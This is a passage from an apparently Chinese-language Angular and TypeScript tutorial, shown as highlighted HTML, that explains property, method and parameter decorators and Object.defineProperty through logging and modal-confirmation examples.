            getSetCall<span class="token punctuation">.</span>set<span class="token operator">?.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> newValue<span class="token punctuation">,</span> propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        propertyValue <span class="token operator">=</span> newValue<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">LogChanges</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> Object<span class="token punctuation">,</span> key<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> propertyValue<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> propertyValue<span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newValue</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        propertyValue <span class="token operator">=</span> newValue<span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is now </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>propertyValue<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Fruit</span> <span class="token punctuation">{</span>
  @LogChanges
  name<span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> fruit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fruit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fruit<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'apple'</span><span class="token punctuation">;</span> <span class="token comment">// console output: 'name is now apple'</span>
fruit<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'banana'</span><span class="token punctuation">;</span> <span class="token comment">// console output: 'name is now banana'</span>
<span class="token comment">// 增加回调</span>
<span class="token keyword">function</span> <span class="token function">LogChanges</span><span class="token punctuation">(</span><span class="token parameter">callbackObject<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> Object<span class="token punctuation">,</span> key<span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> propertyValue<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>
          <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token keyword">return</span> propertyValue<span class="token punctuation">;</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newValue</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              propertyValue <span class="token operator">=</span> newValue<span class="token punctuation">;</span>
              callbackObject<span class="token punctuation">.</span><span class="token function">onchange</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Fruit</span> <span class="token punctuation">{</span>
  @<span class="token function">LogChanges</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token function-variable function">onchange</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">The fruit is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>newValue<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> now</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  name<span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> fruit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fruit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fruit<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'apple'</span><span class="token punctuation">;</span> <span class="token comment">// console output: 'The fruit is apple now'</span>
fruit<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'banana'</span><span class="token punctuation">;</span> <span class="token comment">// console output: 'The fruit is banana now'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br></div></div><h3 id="方法装饰器"><a href="#方法装饰器" class="header-anchor">#</a> 方法装饰器</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>declare type MethodDecorator <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span>Object<span class="token punctuation">,</span> propertyKey<span class="token operator">:</span> string <span class="token operator">|</span> symbol<span class="token punctuation">,</span> descriptor<span class="token operator">:</span> TypePropertyDescript<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> TypedPropertyDescriptor<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token operator">|</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>它接收三个参数：</p> <ul><li><code>target: Object</code> - 被装饰的类</li> <li><code>propertyKey: string | symbol</code> - 方法名</li> <li><code>descriptor: TypePropertyDescript</code> - 属性描述符</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">LogOutput</span><span class="token punctuation">(</span><span class="token parameter">tarage<span class="token operator">:</span> Function<span class="token punctuation">,</span> key<span class="token operator">:</span> string<span class="token punctuation">,</span> descriptor<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> originalMethod <span class="token operator">=</span> descriptor<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token keyword">var</span> <span class="token function-variable function">newMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token operator">:</span> any <span class="token punctuation">{</span>
    <span class="token keyword">var</span> result<span class="token operator">:</span> any <span class="token operator">=</span> <span class="token function">originalMethod</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>loggedOutput<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>loggedOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>loggedOutput<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      method<span class="token operator">:</span> key<span class="token punctuation">,</span>
      parameters<span class="token operator">:</span> args<span class="token punctuation">,</span>
      output<span class="token operator">:</span> result<span class="token punctuation">,</span>
      timestamp<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  descriptor<span class="token punctuation">.</span>value <span class="token operator">=</span> newMethod<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Calculator</span> <span class="token punctuation">{</span>
  @LogOutput
  <span class="token function">double</span> <span class="token punctuation">(</span>num<span class="token operator">:</span> number<span class="token punctuation">)</span><span class="token operator">:</span> number <span class="token punctuation">{</span>
    <span class="token keyword">return</span> num <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> calc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Calculator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
calc<span class="token punctuation">.</span><span class="token function">double</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// console ouput: [{method: &quot;double&quot;, output: 22, ...}]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>calc<span class="token punctuation">.</span>loggedOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>在angular中获取组件this和方法传参并自定义输出：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">ConfirmableFlat</span><span class="token punctuation">(</span><span class="token parameter">params<span class="token operator">:</span> ConfirmableFlatDescription</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token parameter">target<span class="token operator">:</span> object<span class="token punctuation">,</span>
    key<span class="token operator">:</span> string <span class="token operator">|</span> symbol<span class="token punctuation">,</span>
    descriptor<span class="token operator">:</span> PropertyDescriptor</span>
  <span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span>title<span class="token punctuation">,</span> content<span class="token punctuation">,</span> type<span class="token punctuation">,</span> nzBodyStyle<span class="token punctuation">,</span> nzWrapClassName<span class="token punctuation">,</span> nzComponentParams<span class="token punctuation">}</span> <span class="token operator">=</span> params<span class="token punctuation">;</span>
    <span class="token keyword">const</span> original <span class="token operator">=</span> descriptor<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    descriptor<span class="token punctuation">.</span><span class="token function-variable function">value</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> loadingControl<span class="token operator">:</span> Partial<span class="token operator">&lt;</span>LoadingControl<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> modal<span class="token operator">:</span> NzModalRef <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>modalService<span class="token punctuation">[</span><span class="token keyword">typeof</span> type <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">?</span> <span class="token function">type</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>type <span class="token operator">||</span> <span class="token string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        nzTitle<span class="token operator">:</span> <span class="token keyword">typeof</span> title <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">?</span> <span class="token function">title</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">:</span> title<span class="token punctuation">,</span>
        nzContent<span class="token operator">:</span> <span class="token keyword">typeof</span> content <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">?</span> <span class="token function">content</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">:</span> content<span class="token punctuation">,</span>
        nzMaskClosable<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        nzWrapClassName<span class="token punctuation">,</span>
        nzComponentParams<span class="token punctuation">,</span>
        nzBodyStyle<span class="token punctuation">,</span>
        nzOkText<span class="token operator">:</span> <span class="token string">'确定'</span><span class="token punctuation">,</span>
        nzCancelText<span class="token operator">:</span> <span class="token string">'取消'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">nzOnCancel</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
        <span class="token function-variable function">nzOnOk</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> <span class="token function">original</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> loadingControl<span class="token punctuation">,</span> modal<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      ToolsUtil<span class="token punctuation">.</span><span class="token function">watchTool</span><span class="token punctuation">(</span>loadingControl<span class="token punctuation">,</span> <span class="token string">'loading'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        modal<span class="token punctuation">.</span><span class="token function">updateConfig</span><span class="token punctuation">(</span><span class="token punctuation">{</span>nzOkLoading<span class="token operator">:</span> val<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> descriptor<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 使用示例：</span>
 @<span class="token function">ConfirmableFlat</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    title<span class="token operator">:</span> <span class="token string">'删除关卡'</span><span class="token punctuation">,</span>
    <span class="token function">content</span><span class="token punctuation">(</span><span class="token parameter">args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">?</span> <span class="token string">'删除该关卡将同步删除所有学员在此关卡上的所有闯关记录。'</span> <span class="token operator">:</span> <span class="token string">'确定删除'</span> <span class="token operator">+</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'关卡吗？'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    type<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token function">deleteLevel</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token operator">:</span> LevelItem<span class="token punctuation">,</span> loadingControl<span class="token operator">?</span><span class="token operator">:</span> LoadingControl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>otherSettingStoreService<span class="token punctuation">.</span><span class="token function">levelDeletion</span><span class="token punctuation">(</span><span class="token punctuation">{</span>id<span class="token operator">:</span> data<span class="token punctuation">.</span>id<span class="token punctuation">,</span> loadingControl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><h3 id="参数装饰器"><a href="#参数装饰器" class="header-anchor">#</a> 参数装饰器</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>declare type <span class="token function-variable function">ParameterDecorator</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> Object<span class="token punctuation">,</span> propertyKey<span class="token operator">:</span> string <span class="token operator">|</span> symbol<span class="token punctuation">,</span> parameterIndex<span class="token operator">:</span> number</span> <span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>它接收三个参数：</p> <ul><li><code>target: Object</code> - 被装饰的类</li> <li><code>propertyKey: string | symbo</code>l - 方法名</li> <li><code>parameterIndex: number</code> - 方法中参数的索引值</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token operator">:</span> Function<span class="token punctuation">,</span> key<span class="token operator">:</span> string<span class="token punctuation">,</span> parameterIndex<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> functionLogged <span class="token operator">=</span> key <span class="token operator">||</span> target<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>name<span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">The parameter in position </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>parameterIndex<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> at </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>functionLogged<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> has
    been decorated</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Greeter</span> <span class="token punctuation">{</span>
  greeting<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@Log phrase<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>greeting <span class="token operator">=</span> phrase<span class="token punctuation">;</span> 
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// console output: The parameter in position 0 at Greeter has</span>
<span class="token comment">// been decorated</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="object-defineproperty"><a href="#object-defineproperty" class="header-anchor">#</a> Object.defineProperty()</h3> <p><code>Object.defineProperty</code> 用于在一个对象上定义一个新的属性或者修改一个已存在的属性，并返回这个对象。 方法的签名：<code>Object.defineProperty(obj, prop, descriptor)</code> ，参数说明如下：</p> <ul><li>obj 需要定义的属性对象</li> <li>prop 需被定义或修改的属性名</li> <li>descriptor 需被定义或修改的属性的描述符</li></ul> <p>对象里目前存在的属性描述符有两种主要形式：数据描述符和存取描述符。数据描述符是一个拥有可写或不可写值的属性。存取描述符是由一对 getter-setter 函数功能来描述的属性。描述符必须是两种形式之一，不能同时是两者。</p> <p>数据描述符和存取描述符均具有以下可选键值：</p> <ul><li>configurable 当且仅当该属性的 configurable 为 true 时，该属性才能够被改变，也能够被删除。默认为 false。</li> <li>enumerable 当且仅当该属性的 enumerable 为 true 时，该属性才能够出现在对象的枚举属性中。默认为 false。</li></ul> <p>数据描述符同时具有以下可选键值：</p> <ul><li>value 该属性对应的值。可以是任何有效的 JavaScript 值（数值，对象，函数等）。默认为 undefined。</li> <li>writable 当且仅当仅当该属性的writable为 true 时，该属性才能被赋值运算符改变。默认为 false。</li></ul> <p>存取描述符同时具有以下可选键值：</p> <ul><li>get 一个给属性提供 getter 的方法，如果没有 getter 则为 undefined。该方法返回值被用作属性值。默认为undefined。</li> <li>set 一个给属性提供 setter 的方法，如果没有 setter 则为 undefined。该方法将接受唯一参数，并将该参数的新值分配给该属性。默认为undefined。</li></ul> <p>使用示例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 创建一个新对象</span>
Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    value <span class="token operator">:</span> <span class="token number">37</span><span class="token punctuation">,</span>
    writable <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    enumerable <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>     
    configurable <span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="组件开始"><a href="#组件开始" class="header-anchor">#</a> 组件开始</h2> <p><code>ng g component 组件名称</code>生成组件模板</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span>    <span class="token string">'hero-list'</span><span class="token punctuation">,</span>
    templateUrl<span class="token operator">:</span> <span class="token string">'./hero-list.component.html'</span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span>  <span class="token punctuation">[</span> HeroService <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">HeroListComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
    <span class="token comment">/* . . . */</span>
<span class="token punctuation">}</span>
